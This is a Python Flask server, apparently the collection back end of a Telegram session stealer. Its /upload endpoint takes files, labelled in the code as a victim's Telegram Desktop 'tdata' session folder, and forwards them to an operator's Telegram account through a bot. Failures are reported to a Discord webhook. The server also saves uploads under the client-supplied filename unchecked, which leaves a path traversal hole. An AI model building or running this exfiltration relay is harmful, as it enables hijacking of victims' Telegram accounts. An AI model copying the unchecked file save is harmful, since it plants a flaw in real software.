import os
import tempfile
import threading
import asyncio
import gc
import requests
from flask import Flask, request, jsonify
from aiogram import Bot
from aiogram.types import FSInputFile

################
#    CONFIG    #
################

BOT_TOKEN = "BOT_TOKEN"
USER_ID = 12345
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/ ?"

app = Flask(__name__)

def send_error(msg):
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"[   **X**   ] **Server Error:** **`{msg}`**"}, timeout=5)
    except:
        pass

def send_telegram(files): # send tdata forlder to telegram
    async def _send():
        bot = Bot(token=BOT_TOKEN)
        try:
            for i, file in enumerate(files):
                size_mb = os.path.getsize(file) / 1024 / 1024
                if size_mb > 50:
                    continue
                await bot.send_document(USER_ID, FSInputFile(file), caption=f"Tdata Part {i+1}/{len(files)} ({size_mb:.1f}MB)")
                await asyncio.sleep(1.5)
        finally:
            await bot.session.close()
            gc.collect()

    asyncio.run(_send())

def process_file(saved_path):
    try:
        send_telegram([saved_path])
    except Exception as e:
        send_error(str(e))
    finally:
        try:
            os.remove(saved_path)
        except:
            pass

@app.route("/upload", methods=["POST"])
def upload():
    if "file" not in request.files:
        return jsonify({"status": "error", "message": "No file provided"}), 400
    file = request.files["file"]
    temp_dir = tempfile.mkdtemp()
    saved_path = os.path.join(temp_dir, file.filename)
    file.save(saved_path)
    threading.Thread(target=process_file, args=(saved_path,), daemon=True).start()
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080) 
